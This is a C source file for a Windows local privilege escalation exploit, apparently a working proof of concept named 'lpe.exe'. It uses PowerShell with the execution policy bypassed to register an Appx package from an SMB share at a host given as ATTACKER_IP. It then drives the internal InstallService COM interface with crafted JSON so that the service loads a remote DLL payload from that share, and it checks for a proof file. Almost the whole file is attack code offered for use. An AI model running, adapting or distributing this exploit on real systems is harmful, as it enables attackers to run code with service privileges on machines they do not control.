#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <process.h>

typedef HRESULT (WINAPI *RoInitializeFn)(int);
typedef void (WINAPI *RoUninitializeFn)(void);
typedef HRESULT (WINAPI *WindowsCreateStringFn)(const WCHAR *, UINT32, void **);
typedef HRESULT (WINAPI *WindowsDeleteStringFn)(void *);
typedef HRESULT (WINAPI *RoActivateInstanceFn)(void *, void **);
typedef HRESULT (STDMETHODCALLTYPE *QueryInterfaceFn)(void *, REFIID, void **);
typedef ULONG (STDMETHODCALLTYPE *ReleaseFn)(void *);
typedef HRESULT (STDMETHODCALLTYPE *CreateWorkFn)(void *, void *, void *, void *, void *, void *, void *, void **);

static char package_name[128] = "DiscCoerceProbe";

#define VTABLE(obj, slot) (((void **)(*(void ***)obj))[slot])

static int register_package(const char *host, const char *share, WCHAR *pfn, int pfn_len, char *location, int location_len)
{
	char cmd[1024];
	char line[1024];
	char *sep;

	snprintf(cmd, sizeof(cmd),
		"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \""
		"$ErrorActionPreference='Stop'; "
		"Get-AppxPackage -Name %s | Remove-AppxPackage -ErrorAction SilentlyContinue; "
		"Add-AppxPackage -Register '\\\\%s\\%s\\AppxManifest.xml'; "
		"$p=Get-AppxPackage -Name %s; if (-not $p) { exit 2 }; "
		"Write-Output ($p.PackageFamilyName + '|' + $p.InstallLocation)\"",
		package_name, host, share, package_name);

	FILE *pipe = _popen(cmd, "r");
	if (!pipe)
		return -1;

	if (!fgets(line, (int)sizeof(line), pipe)) {
		_pclose(pipe);
		return -1;
	}

	{
		int st = _pclose(pipe);
		if (st != 0) {
			printf("\tpowershell exit=%d output:\n%s\n", st, line);
			return st;
		}
	}

	sep = strchr(line, '|');
	if (!sep) {
		printf("\tunexpected package output:\n%s\n", line);
		return -1;
	}

	*sep = 0;
	MultiByteToWideChar(CP_ACP, 0, line, -1, pfn, pfn_len);
	snprintf(location, location_len, "%s", sep + 1);
	return 0;
}

static HRESULT trigger_install_work(
	RoInitializeFn ro_initialize,
	RoUninitializeFn ro_uninitialize,
	WindowsCreateStringFn windows_create_string,
	WindowsDeleteStringFn windows_delete_string,
	RoActivateInstanceFn ro_activate_instance,
	const WCHAR *pfn,
	const char *host,
	const char *share)
{
	WCHAR unc[256];
	WCHAR host_w[128];
	WCHAR share_w[128];
	WCHAR json_unc[512];
	WCHAR json_pfn[256];
	WCHAR fulfillment[1024];
	WCHAR json_fulfillment[1536];
	WCHAR properties[2048];
	const WCHAR *src;
	int i;
	void *class_name = NULL;
	void *correlation = NULL;
	void *caller = NULL;
	void *arg3 = NULL;
	void *arg4 = NULL;
	void *props = NULL;
	void *options = NULL;
	void *instance = NULL;
	void *control = NULL;
	void *view = NULL;
	HRESULT result;
	static const GUID install_service_iid = { 0xe4893a99, 0x9270, 0x42b9, { 0x9a, 0x62, 0x68, 0x3d, 0x6c, 0xee, 0xd2, 0x50 } };

	MultiByteToWideChar(CP_ACP, 0, host, -1, host_w, 128);
	MultiByteToWideChar(CP_ACP, 0, share, -1, share_w, 128);
	swprintf(unc, 256, L"\\\\%ls\\%ls\\InstallServicePlugin.dll", host_w, share_w);

	i = 0;
	json_unc[i++] = L'"';
	for (src = unc; *src && i + 4 < (int)(sizeof(json_unc) / sizeof(json_unc[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_unc[i++] = L'\\';
		json_unc[i++] = *src;
	}
	json_unc[i++] = L'"';
	json_unc[i] = 0;

	i = 0;
	json_pfn[i++] = L'"';
	for (src = pfn; *src && i + 4 < (int)(sizeof(json_pfn) / sizeof(json_pfn[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_pfn[i++] = L'\\';
		json_pfn[i++] = *src;
	}
	json_pfn[i++] = L'"';
	json_pfn[i] = 0;

	swprintf(fulfillment, 1024,
		L"{\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\",\"PackageFamilyName\":%ls,\"FulfillmentPluginId\":%ls,\"Market\":\"US\",\"SourceUri\":%ls}",
		json_pfn, json_pfn, json_unc);

	i = 0;
	json_fulfillment[i++] = L'"';
	for (src = fulfillment; *src && i + 4 < (int)(sizeof(json_fulfillment) / sizeof(json_fulfillment[0])); src++) {
		if (*src == L'\\' || *src == L'"')
			json_fulfillment[i++] = L'\\';
		json_fulfillment[i++] = *src;
	}
	json_fulfillment[i++] = L'"';
	json_fulfillment[i] = 0;

	swprintf(properties, 2048,
		L"{\"SkipCatalogLookup\":true,\"SourceUri\":%ls,\"ProductId\":\"coerce\",\"SkuId\":\"0001\",\"ProductTitle\":\"coerce\",\"PackageFamilyName\":%ls,\"FulfillmentPluginId\":%ls,\"Market\":\"US\",\"SerializedFulfillmentData\":%ls}",
		json_unc, json_pfn, json_pfn, json_fulfillment);

	ro_initialize(1);
	windows_create_string(L"Windows.Internal.InstallService.Control.InstallServiceControl",
		(UINT32)wcslen(L"Windows.Internal.InstallService.Control.InstallServiceControl"), &class_name);

	result = ro_activate_instance(class_name, &instance);
	if (FAILED(result)) {
		printf("\tRoActivateInstance=0x%08X\n", (unsigned int)result);
		goto done;
	}

	result = ((QueryInterfaceFn)VTABLE(instance, 0))(instance, &install_service_iid, &control);
	if (FAILED(result)) {
		printf("\tQueryInterface=0x%08X\n", (unsigned int)result);
		goto done;
	}

	windows_create_string(L"uncanny", 7, &correlation);
	windows_create_string(L"", 0, &caller);
	windows_create_string(L"", 0, &arg3);
	windows_create_string(L"", 0, &arg4);
	windows_create_string(properties, (UINT32)wcslen(properties), &props);
	windows_create_string(L"{}", 2, &options);

	result = ((CreateWorkFn)VTABLE(control, 8))(control, correlation, caller, arg3, arg4, props, options, &view);

done:
	if (correlation)
		windows_delete_string(correlation);
	if (caller)
		windows_delete_string(caller);
	if (arg3)
		windows_delete_string(arg3);
	if (arg4)
		windows_delete_string(arg4);
	if (props)
		windows_delete_string(props);
	if (options)
		windows_delete_string(options);
	if (view)
		((ReleaseFn)VTABLE(view, 2))(view);
	if (control)
		((ReleaseFn)VTABLE(control, 2))(control);
	if (instance)
		((ReleaseFn)VTABLE(instance, 2))(instance);
	if (class_name)
		windows_delete_string(class_name);
	ro_uninitialize();

	return result;
}

int main(int argc, char **argv)
{
	HMODULE combase;
	RoInitializeFn ro_initialize;
	RoUninitializeFn ro_uninitialize;
	WindowsCreateStringFn windows_create_string;
	WindowsDeleteStringFn windows_delete_string;
	RoActivateInstanceFn ro_activate_instance;
	const char *host;
	const char *share;
	const char *package_arg;
	const char *pfn_arg;
	char user[128];
	DWORD user_len;
	HANDLE token;
	TOKEN_ELEVATION elevation;
	DWORD elevation_len;
	BOOL elevated;
	WCHAR pfn[256];
	char location[512];
	HRESULT trigger_result;
	DWORD proof_attr;
	BOOL proof_exists;
	int register_result;

	if (argc < 2) {
		printf("usage: lpe.exe <host> [share] [package] [pfn]\n");
		printf("example: lpe.exe ATTACKER_IP coerce\n");
		return 1;
	}

	host = argv[1];
	share = argc >= 3 ? argv[2] : "coerce";
	package_arg = argc >= 4 ? argv[3] : "DiscCoerceProbe";
	pfn_arg = argc >= 5 ? argv[4] : NULL;
	snprintf(package_name, sizeof(package_name), "%s", package_arg);

	combase = LoadLibraryW(L"combase.dll");
	if (!combase) {
		printf("[-] LoadLibraryW(combase.dll) failed\n");
		return 1;
	}

	ro_initialize = (RoInitializeFn)GetProcAddress(combase, "RoInitialize");
	ro_uninitialize = (RoUninitializeFn)GetProcAddress(combase, "RoUninitialize");
	windows_create_string = (WindowsCreateStringFn)GetProcAddress(combase, "WindowsCreateString");
	windows_delete_string = (WindowsDeleteStringFn)GetProcAddress(combase, "WindowsDeleteString");
	ro_activate_instance = (RoActivateInstanceFn)GetProcAddress(combase, "RoActivateInstance");

	if (!ro_initialize || !ro_uninitialize || !windows_create_string || !windows_delete_string || !ro_activate_instance) {
		printf("[-] GetProcAddress combase exports failed\n");
		return 1;
	}

	user_len = (DWORD)sizeof(user);
	GetUserNameA(user, &user_len);

	elevated = FALSE;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		elevation_len = sizeof(elevation);
		if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &elevation_len))
			elevated = elevation.TokenIsElevated ? TRUE : FALSE;
		CloseHandle(token);
	}

	printf("[*] user: %s\n", user);
	printf("[*] elevated: %s\n", elevated ? "true" : "false");
	printf("[*] manifest: \\\\%s\\%s\\AppxManifest.xml\n", host, share);
	printf("[*] payload path: \\\\%s\\%s\\InstallServicePlugin.dll\n\n", host, share);
	printf("[*] package: %s\n", package_name);

	memset(pfn, 0, sizeof(pfn));
	memset(location, 0, sizeof(location));

	if (pfn_arg) {
		MultiByteToWideChar(CP_ACP, 0, pfn_arg, -1, pfn, 256);
		snprintf(location, sizeof(location), "\\\\%s\\%s", host, share);
		printf("[1] using supplied PFN\n");
	} else {
		printf("[1] registering loose package from UNC\n");
		register_result = register_package(host, share, pfn, 256, location, (int)sizeof(location));
		if (register_result != 0 || !pfn[0]) {
			printf("[-] package registration failed, result=%d\n", register_result);
			printf("\tcheck Developer Mode, interactive session, manifest files, and NTFS-reporting SMB share\n");
			return 1;
		}
	}

	printf("\tPFN: %ls\n", pfn);
	printf("\tInstalledLocation: %s\n\n", location);

	if (strncmp(location, "\\\\", 2) != 0) {
		printf("[-] InstalledLocation is not UNC, stopping before trigger\n");
		return 1;
	}

	printf("[2] submitting CreateInstallServiceWork\n");
	trigger_result = trigger_install_work(ro_initialize, ro_uninitialize, windows_create_string,
		windows_delete_string, ro_activate_instance, pfn, host, share);
	printf("\tCreateInstallServiceWork=0x%08X\n\n", (unsigned int)trigger_result);

	Sleep(1000);

	proof_attr = GetFileAttributesW(L"C:\\Users\\Public\\uncanny_lpe.txt");
	proof_exists = proof_attr != INVALID_FILE_ATTRIBUTES && !(proof_attr & FILE_ATTRIBUTE_DIRECTORY);

	if (proof_exists) {
		printf("[+] proof file exists: C:\\Users\\Public\\uncanny_lpe.txt\n");
		printf("[+] the remote DLL executed inside the service process\n");
	} else if (SUCCEEDED(trigger_result)) {
		printf("[+] InstallService should try LoadLibraryW on the UNC payload path\n");
		printf("[+] proof file is missing, so only claim coercion until the DLL marker appears\n");
	} else {
		printf("[-] trigger failed before the proof file appeared\n");
	}

	return proof_exists || SUCCEEDED(trigger_result) ? 0 : 1;
}
